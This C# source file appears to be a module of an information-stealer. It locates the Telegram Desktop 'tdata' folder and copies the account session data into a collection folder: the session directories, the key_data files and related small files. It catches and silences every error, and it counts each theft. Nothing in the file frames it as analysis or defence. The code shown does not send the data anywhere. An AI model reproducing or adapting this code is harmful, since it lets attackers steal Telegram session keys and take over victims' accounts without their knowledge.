using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;

namespace SHARP
{
    internal class Telegram
    {
      private static string GetTdata()
      {
        string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
        Process[] processesByName = Process.GetProcessesByName(nameof (Telegram));
        return processesByName.Length == 0 ? str : Path.Combine(Path.GetDirectoryName(ProcessList.ProcessExecutablePath(processesByName[0])), "tdata");
      }

      public static async Task GetTelegramSessions(string head)
      {
        string str1 = head;
        string tdata = Telegram.GetTdata();
        try
        {
          if (!Directory.Exists(tdata))
            return;
          string str2 = str1 + "\\Telegram";
          Directory.CreateDirectory(str2);
          string[] directories = Directory.GetDirectories(tdata);
          string[] files = Directory.GetFiles(tdata);
          foreach (string str3 in directories)
          {
            string name = new DirectoryInfo(str3).Name;
            if (name.Length == 16 /*0x10*/)
            {
              string targetDir = Path.Combine(str2, name);
              Filemanager.CopyDirectory(str3, targetDir);
            }
          }
          foreach (string fileName in files)
          {
            FileInfo fileInfo = new FileInfo(fileName);
            string name = fileInfo.Name;
            string destFileName = Path.Combine(str2, name);
            if (fileInfo.Length <= 5120L)
            {
              if (name.EndsWith("s") && name.Length == 17)
              {
                fileInfo.CopyTo(destFileName);
              }
              else
              {
                if (name.StartsWith("usertag") || name.StartsWith("settings") || name.StartsWith("key_data"))
                  fileInfo.CopyTo(destFileName);
                ++Counting.Telegram;
              }
            }
          }
        }
        catch
        {
        }
      }
    }
}
